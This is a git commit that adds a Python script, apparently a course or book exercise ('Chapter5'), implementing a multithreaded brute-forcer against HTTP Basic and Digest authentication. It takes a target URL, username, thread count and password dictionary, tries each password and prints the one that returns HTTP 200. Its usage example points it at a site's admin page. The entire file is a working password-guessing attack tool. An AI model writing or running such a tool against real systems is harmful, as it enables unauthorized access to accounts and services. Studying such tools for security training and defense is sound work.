c2ebcfc6a06b02e83f23171c05a40996e2fe2716
zakrush <zakrush@yandex.ru>
2019-09-19 01:10:57 +0300

    add digest auth

---
+++ Chapter5/back2basics_digits.py
@@ -0,0 +1,129 @@
+import requests
+from threading import Thread
+import sys
+from termcolor import colored
+import getopt
+from requests.auth import HTTPDigestAuth
+
+global hit
+hit = "1" # Flag to know when we have a valid password
+
+
+def banner():
+    print("\n********************")
+    print('*  BasicAuth bruteforcer  *')
+    print("********************")
+
+
+
+def usage():
+    print("Usage:")
+    print("         -w: url (http://somesite.com/FUZZ")
+    print("         -t: threads")
+    print("         -u: username")
+    print("         -m: method")
+    print("         -f: dictionary file \n")
+    print("example: back2basics.py -w http://targetsite.com/admin -u admin -t 5 -f common.txt\n")
+
+
+class request_performer(Thread):
+    def __init__(self, passwd, url, user, method):
+        Thread.__init__(self)
+        try:
+            self.password = passwd.split("\n")[0]
+            self.url = url
+            self.username = user
+            self.method = method
+            print("- " + self.password + " -")
+
+        except Exception as e:
+            print(e)
+
+    def run(self):
+        global hit
+        if hit == "1":
+            try:
+                if self.method == "basic":
+
+                    r = requests.get(self.url, auth=(self.username, self.password))
+                elif self.method == "digest":
+                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
+                else:
+                    print("Incorrect method")
+                    sys.exit()
+
+                if r.status_code == 200:
+                    hit = "0"
+                    print("[++++] Password FOUND for user:  "+ colored(self.username, "green") + " password is "
+                          + colored(self.password, 'green') + " - !!!!")
+                    sys.exit()
+                else:
+                    print("Not valid " + self.password)
+                    i[0] = i[0] - 1  # удаляем одну нить из счетчика
+            except Exception as e:
+                print(e)
+
+
+def start(argv):
+    banner()
+    if len(sys.argv) < 5:
+        usage()
+        sys.exit()
+    try:
+        opts, args = getopt.getopt(argv, "w:u:t:f:m:")
+    except getopt.GetoptError:
+        print("Error en arguments")
+        sys.exit()
+
+    for opt, arg in opts:
+        if opt == '-w':
+            url = arg
+        elif opt == '-f':
+            dict = arg
+        elif opt == '-t':
+            threads = int(arg)
+        elif opt == '-u':
+            username = arg
+        elif opt == '-m':
+            meth = arg
+
+    try:
+        f = open(dict, "r")
+        passwds = f.readlines()
+    except:
+        print("Failed opening file: " + dict)
+        sys.exit()
+
+    launcher_thread(passwds, threads, url, username, meth)
+
+
+def launcher_thread(passwd, th, url, username, met):
+    global i
+    i = []
+    i.append(0)
+
+
+    while len(passwd):
+        if hit == "1":
+            try:
+                if i[0] < th:
+                    n = passwd.pop(0)
+                    i[0] = i[0] + 1
+                    thread = request_performer(n, url, username, met)
+                    thread.start()
+
+            except KeyboardInterrupt:
+                print("Back2basics interrupted by user. Finishing attack...")
+                sys.exit()
+            thread.join()
+    return
+
+
+if __name__ == "__main__":
+    try:
+        if hit == "1":
+            start(sys.argv[1:])
+        else:
+            sys.exit()
+    except KeyboardInterrupt:
+        print("Back interrupted by user, killing all threads..!!")
